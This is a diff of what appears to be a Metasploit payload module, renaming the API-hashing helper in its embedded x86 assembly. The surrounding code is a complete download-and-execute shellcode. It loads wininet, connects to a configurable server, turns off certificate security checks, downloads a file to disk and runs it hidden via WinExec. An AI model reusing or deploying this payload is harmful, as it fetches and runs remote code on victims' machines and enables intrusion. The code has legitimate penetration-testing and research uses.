@@ -136,7 +136,7 @@ module MetasploitModule
       push 0x696e6977        ; ...
       mov esi, esp           ; Save a pointer to wininet
       push esp               ; Push a pointer to the "wininet" string on the stack.
-      push #{Rex::Text.hash('kernel32.dll', 'LoadLibraryA')}         ; hash( "kernel32.dll", "LoadLibraryA" )
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}         ; hash( "kernel32.dll", "LoadLibraryA" )
       call ebp               ; LoadLibraryA( "wininet" )
 
     internetopen:
@@ -146,7 +146,7 @@ module MetasploitModule
       push edi               ; LPCTSTR lpszProxyName
       push edi               ; DWORD dwAccessType (PRECONFIG = 0)
       push esi               ; LPCTSTR lpszAgent ("wininet\x00")
-      push #{Rex::Text.hash('wininet.dll', 'InternetOpenA')}       ; hash( "wininet.dll", "InternetOpenA" )
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}       ; hash( "wininet.dll", "InternetOpenA" )
       call ebp
 
       jmp.i8 dbl_get_server_host
@@ -162,7 +162,7 @@ module MetasploitModule
       push #{port_nr}        ; PORT
       push ebx               ; HOSTNAME
       push eax               ; HINTERNET hInternet
-      push #{Rex::Text.hash('wininet.dll', 'InternetConnectA')}    ; hash( "wininet.dll", "InternetConnectA" )
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}    ; hash( "wininet.dll", "InternetConnectA" )
       call ebp
 
       jmp.i8 get_server_uri
@@ -178,7 +178,7 @@ module MetasploitModule
       push ecx                ; url
       push edx                ; method
       push eax                ; hConnection
-      push #{Rex::Text.hash('wininet.dll', 'HttpOpenRequestA')}    ; hash( "wininet.dll", "HttpOpenRequestA" )
+      push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}    ; hash( "wininet.dll", "HttpOpenRequestA" )
       call ebp
       mov esi, eax            ; hHttpRequest
 
@@ -194,7 +194,7 @@ module MetasploitModule
       push eax               ; &dwFlags
       push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
       push esi               ; hRequest
-      push #{Rex::Text.hash('wininet.dll', 'InternetSetOptionA')}   ; hash( "wininet.dll", "InternetSetOptionA" )
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}   ; hash( "wininet.dll", "InternetSetOptionA" )
       call ebp
 
     httpsendrequest:
@@ -204,7 +204,7 @@ module MetasploitModule
       push edi               ; dwHeadersLength
       push edi               ; headers
       push esi               ; hHttpRequest
-      push #{Rex::Text.hash('wininet.dll', 'HttpSendRequestA')}    ; hash( "wininet.dll", "HttpSendRequestA" )
+      push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}    ; hash( "wininet.dll", "HttpSendRequestA" )
       call ebp
       test eax,eax
       jnz create_file
@@ -236,7 +236,7 @@ module MetasploitModule
       push 2            ; dwShareMode
       push 2            ; dwDesiredAccess
       push edi          ; lpFileName
-      push #{Rex::Text.hash('kernel32.dll', 'CreateFileA')}    ; kernel32.dll!CreateFileA
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}    ; kernel32.dll!CreateFileA
       call ebp
 
     download_prep:
@@ -253,7 +253,7 @@ module MetasploitModule
       push eax          ; read length
       push ecx          ; target buffer on stack
       push esi          ; hRequest
-      push #{Rex::Text.hash('wininet.dll', 'InternetReadFile')}   ; hash( "wininet.dll", "InternetReadFile" )
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}   ; hash( "wininet.dll", "InternetReadFile" )
       call ebp
 
       test eax,eax        ; download failed? (optional?)
@@ -271,20 +271,20 @@ module MetasploitModule
       lea eax,[esp+0xc]   ; get pointer to buffer
       push eax            ; lpBuffer
       push ebx            ; hFile
-      push #{Rex::Text.hash('kernel32.dll', 'WriteFile')}        ; kernel32.dll!WriteFile
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}        ; kernel32.dll!WriteFile
       call ebp
       sub esp,4           ; set stack back to where it was
       jmp.i8 download_more
 
     close_and_run:
       push ebx
-      push #{Rex::Text.hash('kernel32.dll', 'CloseHandle')}       ; kernel32.dll!CloseHandle
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}       ; kernel32.dll!CloseHandle
       call ebp
 
     execute_file:
       push 0             ; don't show
       push edi           ; lpCmdLine
-      push #{Rex::Text.hash('kernel32.dll', 'WinExec')}     ; kernel32.dll!WinExec
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'WinExec')}     ; kernel32.dll!WinExec
       call ebp
 
     thats_all_folks:
